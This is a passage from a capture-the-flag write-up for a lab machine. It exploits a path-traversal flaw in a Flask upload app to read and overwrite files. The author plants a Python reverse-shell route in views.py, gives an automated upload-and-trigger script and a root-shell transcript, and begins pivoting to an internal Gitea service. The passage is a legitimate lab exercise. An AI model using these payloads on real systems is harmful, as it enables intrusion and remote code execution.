+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> cat app<span style="color:#f92672">/</span>app<span style="color:#f92672">/</span>views<span style="color:#f92672">.</span>py 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> app.utils <span style="color:#f92672">import</span> get_file_name
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> render_template, request, send_file
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> app <span style="color:#f92672">import</span> app
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#39;/&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;POST&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">upload_file</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;POST&#39;</span>:
+</span></span><span style="display:flex;"><span>        f <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>files[<span style="color:#e6db74">&#39;file&#39;</span>]
+</span></span><span style="display:flex;"><span>        file_name <span style="color:#f92672">=</span> get_file_name(f<span style="color:#f92672">.</span>filename)
+</span></span><span style="display:flex;"><span>        file_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(os<span style="color:#f92672">.</span>getcwd(), <span style="color:#e6db74">&#34;public&#34;</span>, <span style="color:#e6db74">&#34;uploads&#34;</span>, file_name)
+</span></span><span style="display:flex;"><span>        f<span style="color:#f92672">.</span>save(file_path)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;success.html&#39;</span>, file_url<span style="color:#f92672">=</span>request<span style="color:#f92672">.</span>host_url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;uploads/&#34;</span> <span style="color:#f92672">+</span> file_name)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;upload.html&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#39;/uploads/&lt;path:path&gt;&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_report</span>(path):
+</span></span><span style="display:flex;"><span>    path <span style="color:#f92672">=</span> get_file_name(path)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> send_file(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(os<span style="color:#f92672">.</span>getcwd(), <span style="color:#e6db74">&#34;public&#34;</span>, <span style="color:#e6db74">&#34;uploads&#34;</span>, path))
+</span></span></code></pre></div><p>Specifically the <em>get_file_name</em> function which is called from <em>upload_file</em> and <em>send_report</em> functions. If this function is vulnerable and doesn&rsquo;t escape the user input correctly, and if this is the code that the current application runs, then I might be able to exploit it and <em>read</em> or <em>write</em> arbitrary files.</p>
+<p>So let&rsquo;s see how this function handles input:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> cat app<span style="color:#f92672">/</span>app<span style="color:#f92672">/</span>utils<span style="color:#f92672">.</span>py
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">current_milli_time</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> round(time<span style="color:#f92672">.</span>time() <span style="color:#f92672">*</span> <span style="color:#ae81ff">1000</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Pass filename and return a secure version, which can then safely be stored on a regular file system.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_file_name</span>(unsafe_filename):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> recursive_replace(unsafe_filename, <span style="color:#e6db74">&#34;../&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">TODO: get unique filename
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_unique_upload_name</span>(unsafe_filename):
+</span></span><span style="display:flex;"><span>    spl <span style="color:#f92672">=</span> unsafe_filename<span style="color:#f92672">.</span>rsplit(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">.&#34;</span>, <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    file_name <span style="color:#f92672">=</span> spl[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>    file_extension <span style="color:#f92672">=</span> spl[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> recursive_replace(file_name, <span style="color:#e6db74">&#34;../&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;_&#34;</span> <span style="color:#f92672">+</span> str(current_milli_time()) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.&#34;</span> <span style="color:#f92672">+</span> file_extension
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Recursively replace a pattern in a string
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">recursive_replace</span>(search, replace_me, with_me):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> replace_me <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> search:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> search
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> recursive_replace(search<span style="color:#f92672">.</span>replace(replace_me, with_me), replace_me, with_me)
+</span></span></code></pre></div><p>It appears that there are 2 functions, <em>get_file_name</em> (unsafe) and <em>get_unique_upload_name</em> (considered by the developer safe) but is not yet implemented. This code here uses the unsafe <em>get_file_name</em> that calls <em>recursive_replace</em> function which replaces <em>../</em> string with nothing, and since it is recusivly doing that, there is no way to get arround it.</p>
+<p>However in the <em>app/app/views.py</em> this function is called, then its output is passed to the <em>os.path.join</em> function, then to the <em>send_file</em> function from <a href="https://github.com/pallets/flask"><em>Flask</em></a> which will return the content of the file.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cat app/app/views.py 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>import os
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>from app.utils import get_file_name
+</span></span><span style="display:flex;"><span>from flask import render_template, request, send_file
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>from app import app
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>@app.route<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;/&#39;</span>, methods<span style="color:#f92672">=[</span><span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;POST&#39;</span><span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>def upload_file<span style="color:#f92672">()</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request.method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;POST&#39;</span>:
+</span></span><span style="display:flex;"><span>        f <span style="color:#f92672">=</span> request.files<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;file&#39;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>        file_name <span style="color:#f92672">=</span> get_file_name<span style="color:#f92672">(</span>f.filename<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        file_path <span style="color:#f92672">=</span> os.path.join<span style="color:#f92672">(</span>os.getcwd<span style="color:#f92672">()</span>, <span style="color:#e6db74">&#34;public&#34;</span>, <span style="color:#e6db74">&#34;uploads&#34;</span>, file_name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        f.save<span style="color:#f92672">(</span>file_path<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> render_template<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;success.html&#39;</span>, file_url<span style="color:#f92672">=</span>request.host_url + <span style="color:#e6db74">&#34;uploads/&#34;</span> + file_name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;upload.html&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>@app.route<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;/uploads/&lt;path:path&gt;&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>def send_report<span style="color:#f92672">(</span>path<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>    path <span style="color:#f92672">=</span> get_file_name<span style="color:#f92672">(</span>path<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> send_file<span style="color:#f92672">(</span>os.path.join<span style="color:#f92672">(</span>os.getcwd<span style="color:#f92672">()</span>, <span style="color:#e6db74">&#34;public&#34;</span>, <span style="color:#e6db74">&#34;uploads&#34;</span>, path<span style="color:#f92672">))</span>
+</span></span></code></pre></div><p>From the first look this code appears to be secure, however the use of <em>os.path.join</em> ruined everything, because if this function takes parameters like <em>(&quot;/var/www/html&quot;, &ldquo;app&rdquo;, &ldquo;/etc/passwd&rdquo;)</em> and tries to return the path of that, instead of returning something like <em>&quot;/var/www/html/app/etc/passwd&quot;</em>, it will return <em>&quot;/etc/passwd&quot;</em> due to the <em>/</em> at the begining of the last string.</p>
+<h3 id="exploiting-the-vulnerability">Exploiting the Vulnerability</h3>
+<p>Now let&rsquo;s try to see if this vulnerability exists in the production code.</p>
+<p>For this I will try to upload a file first and then access it to make sure that everything is normal and the application is taking my file and storing it somewhere.</p>
+<p><img src="trying-to-upload-normal-file.png" alt="Uploading Normal file"></p>
+<p>Looks like this application is not using a function like <em>get_unique_upload_name</em> because the name of the uploaded file is the same.</p>
+<p>Now I will try the <em>Local File Inclusion</em> payload using <a href="https://portswigger.net/burp"><em>Burp Suite</em></a>.</p>
+<p><img src="Initial-LFI-try.png" alt="LFI Initial Try"></p>
+<p>Looks like I got redirected. After playing a little bit with <a href="https://github.com/pallets/flask"><em>Flask</em></a> localy, I noticed that this is a nomral behavior in it, if the url path contained something like <em>uploads//something/here</em> it will redirect it to <em>uploads/something/here</em> then will process this new request.</p>
+<p>To avoid this, I can make use fo the <em>get_file_name</em> being called to check for <em>../</em> string and remove it:</p>
+<ul>
+<li>First, I will request the path <em>uploads/..//etc/passwd</em></li>
+<li><a href="https://github.com/pallets/flask"><em>Flask</em></a> will not redirect this request because the path is not <em>uploads//</em></li>
+<li>Then it will call the <em>get_file_name</em> function on <em>..//etc/passwd</em> which will remove <em>../</em> and return <em>/etc/passwd</em></li>
+<li>Finally <em>/etc/passwd</em> string will pass to the <em>os.path.join</em> function as parameter and will result in <em>/etc/passwd</em> being the file read</li>
+</ul>
+<p><img src="reading-files-with-LFI.png" alt="Reading Files with LFI"></p>
+<p>I can now <em>read</em> files using this payload, however the <em>upload_file</em> function also uses the same process, which means that I can override files by passing <em>..//[path][file to override]</em> as filename.</p>
+<h3 id="overriting-files-to-get-a-reverse-shell">Overriting Files to Get a Reverse Shell</h3>
+<p>One possible way to get a reverse shell is to override the <em>views.py</em> file and append to it a new route that will execute our malicious code when accessed.</p>
+<p>But first, I need to know where this file exists. I can do that by trying to intentionnally raise an error in the application, to see if I can get any sort of verbose error logging telling me what went wrong.</p>
+<p><img src="Indentifying-where-the-application-exists.png" alt="Finding Where The Application Is"></p>
+<p>Now I know that the application is inside the <em>/app/</em> directory and has the same upload hierarchy as the one I just unziped, meaning that I can guess that the <em>views.py</em> will be at <em>/app/app/views.py</em></p>
+<p><img src="Reading-views-using-LFI.png" alt="Reading Views.py using LFI"></p>
+<p>This code looks very similar to the one I saw before, so what I&rsquo;ll do is copy this file and append to it my malicious code then upload a new file with the name of <em>..//app/app/views.py</em> which will override the current <em>views.py</em> with my own malicious one.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> cat malicious<span style="color:#f92672">-</span>views<span style="color:#f92672">.</span>py
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># my own imports for the reverse shell to work</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> pty
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#############</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> app.utils <span style="color:#f92672">import</span> get_file_name
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> render_template, request, send_file
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> app <span style="color:#f92672">import</span> app
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#39;/&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;index.html&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#39;/download&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">download</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> send_file(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(os<span style="color:#f92672">.</span>getcwd(), <span style="color:#e6db74">&#34;app&#34;</span>, <span style="color:#e6db74">&#34;static&#34;</span>, <span style="color:#e6db74">&#34;source.zip&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#39;/upcloud&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;POST&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">upload_file</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;POST&#39;</span>:
+</span></span><span style="display:flex;"><span>        f <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>files[<span style="color:#e6db74">&#39;file&#39;</span>]
+</span></span><span style="display:flex;"><span>        file_name <span style="color:#f92672">=</span> get_file_name(f<span style="color:#f92672">.</span>filename)
+</span></span><span style="display:flex;"><span>        file_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(os<span style="color:#f92672">.</span>getcwd(), <span style="color:#e6db74">&#34;public&#34;</span>, <span style="color:#e6db74">&#34;uploads&#34;</span>, file_name)
+</span></span><span style="display:flex;"><span>        f<span style="color:#f92672">.</span>save(file_path)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;success.html&#39;</span>, file_url<span style="color:#f92672">=</span>request<span style="color:#f92672">.</span>host_url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;uploads/&#34;</span> <span style="color:#f92672">+</span> file_name)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;upload.html&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#39;/uploads/&lt;path:path&gt;&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_report</span>(path):
+</span></span><span style="display:flex;"><span>    path <span style="color:#f92672">=</span> get_file_name(path)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> send_file(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(os<span style="color:#f92672">.</span>getcwd(), <span style="color:#e6db74">&#34;public&#34;</span>, <span style="color:#e6db74">&#34;uploads&#34;</span>, path))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># my own malicious route to get a reverse shell</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#39;/revShell/&lt;ip&gt;/&lt;port&gt;&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">connect_back</span>(ip<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, port<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>):
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">=</span>socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET,socket<span style="color:#f92672">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>connect((str(ip),int(port)))
+</span></span><span style="display:flex;"><span>    os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>    os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>    pty<span style="color:#f92672">.</span>spawn(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>)
+</span></span></code></pre></div><ul>
+<li>Code for reverse shell taken from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python">PayloadsAllTheThings</a></li>
+</ul>
+<p>I&rsquo;ll intercept the upload file request using <a href="https://portswigger.net/burp"><em>Burp Suite</em></a> and change the filename:</p>
+<p><img src="overriding-views-file.png" alt="Overwriting views.py with malicious code"></p>
+<p>Now let&rsquo;s get a reverse shell by navigating the to newly created view, <em><a href="http://opensource.htb/revShell/10.10.16.59/8989">http://opensource.htb/revShell/10.10.16.59/8989</a></em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nc -lvnp <span style="color:#ae81ff">8989</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">8989</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.16.59<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.11.164<span style="color:#f92672">]</span> <span style="color:#ae81ff">52332</span>
+</span></span><span style="display:flex;"><span>/app <span style="color:#75715e"># id        </span>
+</span></span><span style="display:flex;"><span>    id
+</span></span><span style="display:flex;"><span>    uid<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>,1<span style="color:#f92672">(</span>bin<span style="color:#f92672">)</span>,2<span style="color:#f92672">(</span>daemon<span style="color:#f92672">)</span>,3<span style="color:#f92672">(</span>sys<span style="color:#f92672">)</span>,4<span style="color:#f92672">(</span>adm<span style="color:#f92672">)</span>,6<span style="color:#f92672">(</span>disk<span style="color:#f92672">)</span>,10<span style="color:#f92672">(</span>wheel<span style="color:#f92672">)</span>,11<span style="color:#f92672">(</span>floppy<span style="color:#f92672">)</span>,20<span style="color:#f92672">(</span>dialout<span style="color:#f92672">)</span>,26<span style="color:#f92672">(</span>tape<span style="color:#f92672">)</span>,27<span style="color:#f92672">(</span>video<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>/app <span style="color:#75715e"># ip addr </span>
+</span></span><span style="display:flex;"><span>    ip addr
+</span></span><span style="display:flex;"><span>    1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span style="color:#ae81ff">65536</span> qdisc noqueue state UNKNOWN qlen <span style="color:#ae81ff">1000</span>
+</span></span><span style="display:flex;"><span>        link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+</span></span><span style="display:flex;"><span>        inet 127.0.0.1/8 scope host lo
+</span></span><span style="display:flex;"><span>        valid_lft forever preferred_lft forever
+</span></span><span style="display:flex;"><span>    20: eth0@if21: &lt;BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN&gt; mtu <span style="color:#ae81ff">1500</span> qdisc noqueue state UP 
+</span></span><span style="display:flex;"><span>        link/ether 02:42:ac:11:00:05 brd ff:ff:ff:ff:ff:ff
+</span></span><span style="display:flex;"><span>        inet 172.17.0.5/16 brd 172.17.255.255 scope global eth0
+</span></span><span style="display:flex;"><span>        valid_lft forever preferred_lft forever
+</span></span></code></pre></div><ul>
+<li>
+<p>You might get some weird characters at the begining of the prompt like <em>/app # ^[[24;8R</em> which is ok, you can avoid this by getting a fully interactive shell, via backgrounding the shell using <em>CTRL+z</em> then issuing the command <em>stty raw -echo;fg</em> and pressing enter.</p>
+</li>
+<li>
+<p>This is a simple python3 script I wrote to upload the file automatically and get a reverse shell, I just need to listen on my specified port before executing it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> cat upload_malicious<span style="color:#f92672">.</span>py 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sleep
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span>:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Provide your listening IP followed by the Port as argument&#34;</span>)
+</span></span><span style="display:flex;"><span>    exit(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ip <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;malicious-views.py&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>    malView <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>malFile <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;file&#34;</span>: (<span style="color:#e6db74">&#34;..//app/app/views.py&#34;</span>, malView)}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#34;http://opensource.htb/upcloud&#34;</span>, files<span style="color:#f92672">=</span>malFile)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(res)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;http://opensource.htb/revShell/</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(ip, port))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(res)
+</span></span></code></pre></div></li>
+</ul>
+<h2 id="discovering-the-application-on-port-3000">Discovering the Application on port 3000</h2>
+<p>It looks like we are root inside a docker container. I can also see a request comming from the main host to this machine every few minutes <em>172.17.0.1 - - [05/Oct/2022 15:02:02] &ldquo;GET / HTTP/1.1&rdquo; 200 -</em>.</p>
+<p>The first thing I&rsquo;ll do is to check the port <em>3000</em> that was previously marked as <em>filtered</em> by nmap to see if I can get anything.</p>
+<p>Using <em>netcat</em>, I&rsquo;ll check to see if this is a webserver (usually webservers runs on port 3000).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>/app <span style="color:#75715e"># nc 172.17.0.1 3000</span>
+</span></span><span style="display:flex;"><span>HEAD / HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: 172.17.0.1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>Set-Cookie: i_like_gitea<span style="color:#f92672">=</span>a0f2435183e3d93a; Path<span style="color:#f92672">=</span>/; HttpOnly; SameSite<span style="color:#f92672">=</span>Lax
+</span></span><span style="display:flex;"><span>Date: Wed, <span style="color:#ae81ff">05</span> Oct <span style="color:#ae81ff">2022</span> 15:11:22 GMT
+</span></span></code></pre></div><p>And I got a response, and by reading the session cookie I can tell that this application is <a href="https://gitea.io/en-us/"><em>Gitea</em></a>.</p>
+<h3 id="getting-user-on-the-host-machine">Getting User On the Host Machine</h3>
+<p>I&rsquo;ll upload <a href="https://github.com/jpillora/chisel/releases"><em>chisel</em></a> to the victim machine and <em>port forward</em> the port <em>3000</em> to my local attacking machine.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 -m http.server
+</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> <span style="color:#f92672">(</span>http://0.0.0.0:8000/<span style="color:#f92672">)</span> ...
